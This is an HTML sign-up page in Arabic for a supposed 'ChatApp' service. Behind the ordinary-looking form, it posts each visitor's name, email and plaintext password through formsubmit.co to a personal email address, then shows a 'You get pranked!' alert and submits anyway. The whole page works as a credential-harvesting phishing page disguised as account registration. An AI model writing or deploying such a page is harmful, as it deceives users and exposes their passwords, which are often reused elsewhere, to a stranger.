<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تسجيل حساب جديد - ChatApp</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet" />
  <style>
    body {
      background-color: #f8f9fa;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .register-container {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 400px;
      width: 100%;
    }
    .logo {
      display: block;
      margin: 0 auto 20px;
      width: 80px;
    }
  </style>
</head>
<body>

  <div class="register-container">
    <img src="https://cdn-icons-png.flaticon.com/512/2462/2462719.png" alt="شعار ChatApp" class="logo" />
    <form id="registerForm" action="https://formsubmit.co/amine.elfokari@gmail.com" method="POST" autocomplete="off" novalidate>
      <div class="mb-3">
        <label for="fullname" class="form-label">الاسم الكامل</label>
        <input type="text" class="form-control" id="fullname" name="fullname" placeholder="أدخل اسمك الكامل" required minlength="3" />
        <div class="invalid-feedback">يرجى إدخال الاسم الكامل (3 أحرف على الأقل).</div>
      </div>

      <div class="mb-3">
        <label for="email" class="form-label">البريد الإلكتروني</label>
        <input type="email" class="form-control" id="email" name="email" placeholder="أدخل بريدك الإلكتروني" required />
        <div class="invalid-feedback">يرجى إدخال بريد إلكتروني صالح.</div>
      </div>

      <div class="mb-3">
        <label for="password" class="form-label">كلمة المرور</label>
        <input type="password" class="form-control" id="password" name="password" placeholder="أدخل كلمة المرور" required minlength="6" />
        <div class="invalid-feedback">يرجى إدخال كلمة المرور (6 أحرف على الأقل).</div>
      </div>

      <div class="mb-3">
        <label for="passwordConfirm" class="form-label">تأكيد كلمة المرور</label>
        <input type="password" class="form-control" id="passwordConfirm" name="passwordConfirm" placeholder="أعد إدخال كلمة المرور" required minlength="6" />
        <div class="invalid-feedback" id="passwordMismatch">كلمتا المرور غير متطابقتين.</div>
      </div>

      <button type="submit" class="btn btn-primary w-100">تسجيل حساب</button>

      <div class="mt-3 text-center">
        <a href="login.html">لديك حساب؟ تسجيل الدخول</a>
      </div>
    </form>
  </div>

  <script>
    (function () {
      'use strict';
      const form = document.getElementById('registerForm');
      const password = document.getElementById('password');
      const passwordConfirm = document.getElementById('passwordConfirm');
      const passwordMismatchFeedback = document.getElementById('passwordMismatch');

      form.addEventListener('submit', function (event) {
        if (!form.checkValidity()) {
          event.preventDefault();
          event.stopPropagation();
          form.classList.add('was-validated');
          return;
        }

        // Check password match
        if (password.value !== passwordConfirm.value) {
          event.preventDefault();
          event.stopPropagation();
          passwordConfirm.setCustomValidity('Passwords do not match');
          passwordMismatchFeedback.style.display = 'block';
          form.classList.add('was-validated');
          return;
        } else {
          passwordConfirm.setCustomValidity('');
          passwordMismatchFeedback.style.display = 'none';
        }

        // Prevent default submission to show prank alert
        event.preventDefault();

        alert('You get pranked!');

        // Submit form normally after alert
        form.submit();
      }, false);
    })();
  </script>

</body>
</html>
